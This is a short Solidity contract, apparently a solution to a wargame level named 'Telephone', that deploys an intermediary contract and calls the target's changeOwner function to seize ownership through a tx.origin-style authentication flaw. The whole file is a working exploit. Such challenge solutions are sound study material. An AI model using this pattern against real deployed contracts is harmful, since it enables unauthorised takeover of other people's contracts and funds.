//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract N4Attacker {
    address public owner;
    Telephone public victim;

    constructor(address _victim) {
        owner = msg.sender;
        victim = Telephone(_victim);
    }

    function attack() public {
        victim.changeOwner(owner);
    }
}